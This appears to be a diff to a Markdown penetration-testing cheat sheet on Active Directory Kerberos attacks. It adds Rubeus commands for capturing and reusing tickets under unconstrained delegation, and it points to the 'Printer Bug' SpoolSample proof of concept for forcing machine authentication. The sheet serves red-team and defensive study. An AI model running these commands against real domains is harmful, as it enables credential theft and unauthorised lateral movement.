@@ -181,6 +181,27 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
      Rubeus.exe kerberoast /nopreauth:<username> /domain:<domain> /spn:<SPN> /nowrap
      # Instead of /spn, we can use /spns:listofspns.txt and try multiple SPN's
      ```
+
+## Kerberoasting Unconstrained Delegation
+* **Rubeus**
+  Monitor for New TGT's
+  ```powershell
+  .\Rubeus.exe monitor /interval:5 /nowrap
+  ```
+  Use the recieved ticket to access a resource
+  ```powershell
+  .\Rubeus.exe asktgs /ticket:<Recieved Ticket> /service:<SPN> /ptt
+  ```
+  If the above doesn't work, we use renew to get a brand new TGT instead of a TGS
+  ```powershell
+  .\Rubeus.exe renew /ticket:<ticket> /ptt
+  ```
+
+## The Printer Bug
+> There is a bug in the Print System Remote protocol that can force a computer to authenticate to any computer in the domain, thus allowing us to capture the machine TGT
+
+* **We can use the [SpoolSample POC](https://github.com/leechristensen/SpoolSample) to accomplish this
+
 **Mitigations**:
 
 * Have a very long password for your accounts with SPNs (> 32 characters)
